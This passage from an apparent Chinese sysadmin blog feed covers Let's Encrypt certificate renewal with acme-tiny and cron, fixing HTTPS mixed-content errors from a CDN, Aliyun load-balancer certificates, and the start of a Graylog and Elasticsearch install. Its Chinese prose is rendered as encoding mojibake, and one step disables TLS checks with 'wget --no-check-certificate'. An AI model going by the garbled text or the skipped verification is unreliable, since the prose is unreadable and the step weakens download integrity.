&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#!/usr/bin/sh&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;python /srv/ssl/acme_tiny.py --account-key /srv/ssl/account.key --csr /srv/ssl/domain.csr --acme-dir /var/www/challenges/ &amp;gt; /srv/ssl/signed.crt || &lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget -O - https://letsencrypt.org/certs/lets-encrypt-x1-cross-signed.pem &amp;gt; intermediate.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cat /srv/ssl/signed.crt intermediate.pem &amp;gt; /srv/ssl/chained.pem&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;service nginx reload&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¿®æ”¹crontabé…ç½®ï¼ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#æ¯ä¸ªæœˆæ‰§è¡Œä¸€æ¬¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;0 0 1 * * /srv/ssl/renew_cert.sh 2&amp;gt;&amp;gt; /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/acme_tiny.log&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å¤§åŠŸå‘Šæˆï¼Œä¸è¿‡å…ˆåˆ«æ€¥ï¼Œè®¿é—®ä¸‹è‡ªå·±çš„HTTPSç½‘ç«™æ˜¯å¦æ­£å¸¸ï¼Œä¸å‡ºæ„å¤–çš„è¯ï¼Œç½‘ç«™æ­£å¼å¯ç”¨HTTPSï¼Œä½†æ˜¯ç½‘ç«™å¦‚æœæœ‰ç”¨CDNçš„è¯ï¼Œé‚£ä¹ˆéœ€è¦CDNä¹Ÿæ”¯æŒHTTPSæ‰è¡Œï¼Œå¦åˆ™æ— æ³•æ­£å¸¸åŠ è½½CDNçš„èµ„æºï¼Œç±»ä¼¼çš„é”™è¯¯å¦‚ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Mixed Content: The page at &lt;span class=&quot;string&quot;&gt;&#39;https://ihaozhuo.com/&#39;&lt;/span&gt; was loaded over HTTPS, but requested an insecure script &lt;span class=&quot;string&quot;&gt;&#39;http://app.h5.ihaozhuo.combdimg.com/yjk/css/jquery.min.js&#39;&lt;/span&gt;. This request has been blocked; the content must be served over HTTPS.&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯ä½¿ç”¨Upyunæ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¯å‚è€ƒï¼šæˆ‘å†™çš„ä¸€ç¯‡æ–‡ç« å¦‚ä½•è§£å†³httpsè·¨ç«™è®¿é—®è¯ä¹¦ä¸å®‰å…¨è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€ç§è§£å†³æ–¹æ³•å°±æ˜¯ä½¿ç”¨ä¸ƒç‰›çš„äº‘å­˜å‚¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å¯å‚è€ƒï¼š&lt;a href=&quot;https://blog.blahgeek.com/qiniu-cdn-serve-static/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.blahgeek.com/qiniu-cdn-serve-static/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS&quot;&gt;&lt;a href=&quot;#é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS&quot; class=&quot;headerlink&quot; title=&quot;é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS&quot;&gt;&lt;/a&gt;é˜¿é‡Œäº‘SLBå¦‚ä½•é…ç½®HTTPS&lt;/h2&gt;&lt;p&gt;ä½¿ç”¨é˜¿é‡Œäº‘å¾ˆç®€å•ï¼Œä¸éœ€è¦å¤ªå¤šçš„é…ç½®ä¸è¿‡ä¸ªäººè¿˜æ˜¯å–œæ¬¢Nginxå»åšä»£ç†è®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;å…¬å¸åæœŸæ›´æ–°äº†æœ¬åœ°çš„Nginxå»åšè´Ÿè½½å‡è¡¡ç›´æ¥ä½¿ç”¨SLB ï¼Œè¿™é‡Œè®°å½•ä¸‹ç”³è¯·äº†è¯ä¹¦ä»¥ååªéœ€è¦&lt;code&gt;chained.pem&lt;/code&gt;å’Œç§é’¥&lt;code&gt;domain.key&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨SLBè´Ÿè½½å‡è¡¡å·¦ä¾§æœ‰è¯ä¹¦ç®¡ç†-åˆ›å»ºè¯ä¹¦-é€‰æ‹©æœåŠ¡å™¨è¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx-ssl2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶ååœ¨è´Ÿè½½å‡è¡¡ä¸Šé¢è®¾ç½®ä¸‹ç›‘å¬ç«¯å£é€‰æ‹©ä¸‹å¯¹åº”è¯ä¹¦å°±å¯ä»¥äº†ã€‚ &lt;/p&gt;
&lt;h2 id=&quot;å‚è€ƒï¼š&quot;&gt;&lt;a href=&quot;#å‚è€ƒï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒï¼š&quot;&gt;&lt;/a&gt;å‚è€ƒï¼š&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/diafygi/acme-tiny&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GitHub å®‰è£…æ•™ç¨‹ &lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot;&gt;&lt;a href=&quot;#å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot; class=&quot;headerlink&quot; title=&quot;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹HTTPSè¯ä¹¦&quot;&gt;&lt;/a&gt;å¦‚ä½•åœ¨Nginxç”³è¯·å®‰è£…é…ç½®å…è´¹H
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨</title>
    <link href="http://blog.yangcvo.me/2016/11/23/Web%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF/%E7%94%B3%E8%AF%B7%E8%AF%81%E4%B9%A6Https/%E8%A7%A3%E5%86%B3Https%E8%AF%B7%E6%B1%82%E8%B7%A8%E5%9F%9FCDN%E8%B5%84%E6%BA%90http%E7%BD%91%E7%AB%99%E5%87%BA%E7%8E%B0%E8%AE%BF%E9%97%AE%E5%A4%B1%E8%B4%A5-%E8%AF%81%E4%B9%A6%E6%98%BE%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/"/>
    <id>http://blog.yangcvo.me/2016/11/23/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨/</id>
    <published>2016-11-23T09:25:23.000Z</published>
    <updated>2017-04-01T02:04:08.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&quot;&gt;&lt;a href=&quot;#è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&quot;&gt;&lt;/a&gt;è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&lt;/h1&gt;&lt;p&gt;è¿™é‡Œè®²å¦‚ä½•è§£å†³è·¨åŸŸhttpèµ„æºè¯·æ±‚è¯ä¹¦å‡ºç°é—®é¢˜ï¼Œ ä¸Šä¸€ç¯‡æˆ‘è§£å†³ç½‘ç«™å¦‚ä½•ç”³è¯·å…è´¹è¯ä¹¦ï¼Œå®ç°ç”³è¯·å…è´¹è¯ä¹¦åœ¨Nginxä¸Šé¢å®ç°httpsè®¿é—®ã€‚&lt;/p&gt;
&lt;p&gt;å¯æ˜¯æˆ‘ä¸€å¼€å§‹æ²¡æœ‰è¿™ä¹ˆé¡ºåˆ©å®ç°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œå› ä¸ºçš„ç¡®è¯ä¹¦æ˜¯æœ‰äº†è®¿é—®å¯ä»¥httpså¯æ˜¯è¯·æ±‚è·¨åŸŸhttpæœåŠ¡å°±å‡ºç°é—®é¢˜äº†ã€‚&lt;br&gt;è¿™é‡Œæˆ‘æ˜¯åœ¨åˆæ‹äº‘åšCDNåŠ é€Ÿçš„ï¼Œæ‰€ä»¥è¿™é‡Œè¯´æ˜ä¸‹å¦‚æœä½ çš„å…¬å¸ç½‘ç«™æ¯”å¦‚è¯´ï¼šihaozhuo.com&lt;br&gt;é‚£ä¹ˆè¯·æ±‚çš„æ—¶å€™&lt;a href=&quot;https://ihaozhuo.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://ihaozhuo.com&lt;/a&gt; å‡ºç°æˆ‘ä¸‹é¢åŒæ ·çš„é—®é¢˜:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx4.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx5.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4 id=&quot;è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚&quot;&gt;&lt;a href=&quot;#è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚&quot; class=&quot;headerlink&quot; title=&quot;è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚&quot;&gt;&lt;/a&gt;è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚&lt;/h4&gt;&lt;p&gt;è¿™é‡Œæˆ‘ä¹Ÿåšäº†HTTPSå®‰å…¨æ£€æµ‹ï¼š&lt;a href=&quot;https://www.ssllabs.com/ssltest&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.ssllabs.com/ssltest&lt;/a&gt; &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx-ssl.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;å¦‚ä½•è§£å†³ï¼š&quot;&gt;&lt;a href=&quot;#å¦‚ä½•è§£å†³ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å¦‚ä½•è§£å†³ï¼š&quot;&gt;&lt;/a&gt;å¦‚ä½•è§£å†³ï¼š&lt;/h3&gt;&lt;p&gt;è¿™é‡Œæˆ‘é—®å‰ç«¯çš„ä»£ç é™æ€èµ„æºä¸Šé¢è¯·æ±‚upyunçš„httpå»è®¿é—®ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨upyunå¯¹è¯·æ±‚åŸŸåè®¾ç½®httpsæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;upyunå¯¹åº”çš„æœåŠ¡åˆ—è¡¨è®¾ç½®é‡Œé¢é€‰æ‹©httpsè®¾ç½®&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx7.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;é…ç½®å¥½ä»¥åå°±å¯ä»¥ç”Ÿæ•ˆäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œéœ€è¦æŠŠåœ°å€ç»™åˆ°å‰ç«¯è®©ä»–ä»¬åœ¨ä»£ç ä¸Šé¢ä¿®æ”¹ä¸‹HTTPS æ›´æ–°ä¸‹æœåŠ¡é‡å¯å°±å‡ºç°è®¿é—®æ­£å¸¸äº†ã€‚&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/Nginx10.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&quot;&gt;&lt;a href=&quot;#è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨&quot; class=&quot;headerlink&quot; title=&quot;è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttp
    
    </summary>
    
      <category term="nginx" scheme="http://blog.yangcvo.me/categories/nginx/"/>
    
    
      <category term="Web Service" scheme="http://blog.yangcvo.me/tags/Web-Service/"/>
    
      <category term="Nginx" scheme="http://blog.yangcvo.me/tags/Nginx/"/>
    
  </entry>
  
  <entry>
    <title>graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ</title>
    <link href="http://blog.yangcvo.me/2016/11/14/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Graylog/graylog%20%E5%8D%87%E7%BA%A72.1%20%E9%9B%86%E4%B8%AD%E6%97%A5%E5%BF%97%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://blog.yangcvo.me/2016/11/14/æ—¥å¿—åˆ†æå¹³å°/Graylog/graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ/</id>
    <published>2016-11-14T09:56:03.000Z</published>
    <updated>2017-03-14T05:48:39.000Z</updated>
    
    <content type="html">&lt;h1 id=&quot;graylog-å‡çº§2-1-é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot;&gt;&lt;a href=&quot;#graylog-å‡çº§2-1-é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot; class=&quot;headerlink&quot; title=&quot;graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&quot;&gt;&lt;/a&gt;graylog å‡çº§2.1 é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆ&lt;/h1&gt;&lt;p&gt;å‚è€ƒå®˜ç½‘ï¼š&lt;a href=&quot;http://docs.graylog.org/en/2.1/pages/upgrade/graylog-2.1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;å‡çº§åˆ°Graylogçš„2.1.x&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ä¸€ï¼šä¸ºä»€ä¹ˆéœ€è¦é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#ä¸€ï¼šä¸ºä»€ä¹ˆéœ€è¦é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;ä¸€ï¼šä¸ºä»€ä¹ˆéœ€è¦é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆï¼Ÿ&quot;&gt;&lt;/a&gt;ä¸€ï¼šä¸ºä»€ä¹ˆéœ€è¦é›†ä¸­æ—¥å¿—è§£å†³æ–¹æ¡ˆï¼Ÿ&lt;/h3&gt;&lt;p&gt;åœ¨å…¬å¸æœåŠ¡æœºå­éƒ¨ç½²è¶Šæ¥è¶Šå¤šçš„æƒ…å†µä¸‹ï¼Œè®©æˆ‘ä»¬æ¥æƒ³æƒ³ä¼šé‡åˆ°çš„é—®é¢˜ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¼€å‘äººå‘˜ä¸èƒ½ç™»å½•çº¿ä¸ŠæœåŠ¡å™¨æŸ¥çœ‹è¯¦ç»†æ—¥å¿—ï¼Œç»è¿‡è¿ç»´å‘¨è½¬è´¹æ—¶è´¹åŠ›&lt;/li&gt;
&lt;li&gt;æ—¥å¿—æ•°æ®åˆ†æ•£åœ¨å¤šä¸ªç³»ç»Ÿï¼Œéš¾ä»¥æŸ¥æ‰¾&lt;/li&gt;
&lt;li&gt;æ—¥å¿—æ•°æ®é‡å¤§ï¼ŒæŸ¥è¯¢é€Ÿåº¦æ…¢&lt;/li&gt;
&lt;li&gt;ä¸€ä¸ªè°ƒç”¨ä¼šæ¶‰åŠå¤šä¸ªç³»ç»Ÿï¼Œéš¾ä»¥åœ¨è¿™äº›ç³»ç»Ÿçš„æ—¥å¿—ä¸­å¿«é€Ÿå®šä½æ•°æ®&lt;/li&gt;
&lt;li&gt;æ•°æ®ä¸å¤Ÿå®æ—¶&lt;/li&gt;
&lt;li&gt;å¾ˆéš¾å¯¹æ•°æ®è¿›è¡ŒæŒ–æ˜ï¼Œåˆ†æï¼Œä¸šåŠ¡å‘Šè­¦ï¼Œå®¡è®¡&lt;/li&gt;
&lt;li&gt;è¿™äº›é—®é¢˜çš„å­˜åœ¨è®©å¼€å‘ä»¥åŠè¿ç»´äººå‘˜å¾ˆæ˜¯å¤´ç—›ï¼Œä¸¥é‡å½±å“æ•ˆç‡ï¼&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;äºŒï¼šä»€ä¹ˆæ˜¯graylogæŠ€æœ¯æ ˆï¼Ÿ&quot;&gt;&lt;a href=&quot;#äºŒï¼šä»€ä¹ˆæ˜¯graylogæŠ€æœ¯æ ˆï¼Ÿ&quot; class=&quot;headerlink&quot; title=&quot;äºŒï¼šä»€ä¹ˆæ˜¯graylogæŠ€æœ¯æ ˆï¼Ÿ&quot;&gt;&lt;/a&gt;äºŒï¼šä»€ä¹ˆæ˜¯graylogæŠ€æœ¯æ ˆï¼Ÿ&lt;/h3&gt;&lt;p&gt;ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ—¥å¿—çš„é›†ä¸­ç®¡ç†æ–¹æ¡ˆï¼ŒgraylogæŠ€æœ¯æ ˆï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;java ï¼ˆjdk1.8.0_66/ï¼‰ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;Collector-sidecarï¼ˆæ”¶é›†æ—¥å¿—ï¼‰æˆ–è€…syslog&lt;/li&gt;
&lt;li&gt;Mongodbï¼ˆå­˜å‚¨æ—¥å¿—æºæ–‡ä»¶ï¼‰&lt;/li&gt;
&lt;li&gt;Elasticsearchï¼ˆæä¾›æœç´¢æ—¥å¿—ï¼‰&lt;/li&gt;
&lt;li&gt;Graylog2.1.1ï¼ˆæœç´¢å’Œè§†å›¾å±•ç¤ºæ—¥å¿—ï¼Œå‘Šè­¦å’Œæƒé™ï¼‰&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ‰äº†è¿™äº›ï¼Œæˆ‘ä»¬å°±èƒ½æŠŠæ—¥å¿—å…ˆæ”¶é›†èµ·æ¥ï¼Œè¿›è¡Œæˆ‘ä»¬æƒ³è¦çš„åˆ†æä¹‹åï¼Œwebçš„å½¢å¼å±•ç¤ºå‡ºæ¥ï¼Œæä¾›æŸ¥è¯¢ï¼&lt;/p&gt;
&lt;h3 id=&quot;ä¸‰ï¼šgraylogçš„å®‰è£…éƒ¨ç½²&quot;&gt;&lt;a href=&quot;#ä¸‰ï¼šgraylogçš„å®‰è£…éƒ¨ç½²&quot; class=&quot;headerlink&quot; title=&quot;ä¸‰ï¼šgraylogçš„å®‰è£…éƒ¨ç½²&quot;&gt;&lt;/a&gt;ä¸‰ï¼šgraylogçš„å®‰è£…éƒ¨ç½²&lt;/h3&gt;&lt;p&gt;å®‰è£…ç¯å¢ƒï¼šlinux centOSç³»ç»Ÿå®‰è£…ï¼Œå·²å®‰è£…JDK1.8ç‰ˆæœ¬ï¼Œå®‰è£…å¯åŠ¨é¡ºåº&lt;/p&gt;
&lt;p&gt;1.å®‰è£…éƒ¨ç½²mongodb&lt;br&gt;2.å®‰è£…éƒ¨ç½²elasticsearch&lt;br&gt;3.å®‰è£…éƒ¨ç½²graylog&lt;br&gt;4.å®‰è£…éƒ¨ç½²Graylog Collector Sidecar&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt; &lt;strong&gt;1ï¼šå®‰è£…éƒ¨ç½²mongodb&lt;/strong&gt; &lt;strong&gt;Javaä¹Ÿå®‰è£…&lt;/strong&gt;  å‚è€ƒæˆ‘åšæ–‡æœ‰ä»‹ç»ã€‚ &lt;/p&gt;
&lt;p&gt; &lt;strong&gt;2ï¼šå®‰è£…éƒ¨ç½²elasticsearch&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;(1)ä¸‹è½½jaråŒ…&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;wget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å¦‚æœæŠ¥é”™&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ‰§è¡Œ&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget --no-check-certificate&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/tar/elasticsearch/2.3.5/elasticsearch-2.3.5.tar.gz&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(2)è§£å‹jaråŒ…&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;tar -zxvf elasticsearch-2.3.5.tar.gz -C /opt/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;(3)ä¿®æ”¹elasticsearch.ymlé…ç½®æ–‡ä»¶&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; è¿™é‡Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼šé…ç½®å‰å…ˆåˆ›å»ºå‡ ä¸ªç›®å½•æ–‡ä»¶&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;mkdir /home/data/es-data -p&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;mkdir /home/data/es-work -p&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;elasticsearch-2.3.5å®‰è£…ç›®å½•confä¸‹æ‰§è¡Œ&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;vim elasticsearch-2.3.5/config/elasticsearch.yml&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cluster.name: graylog              &lt;span 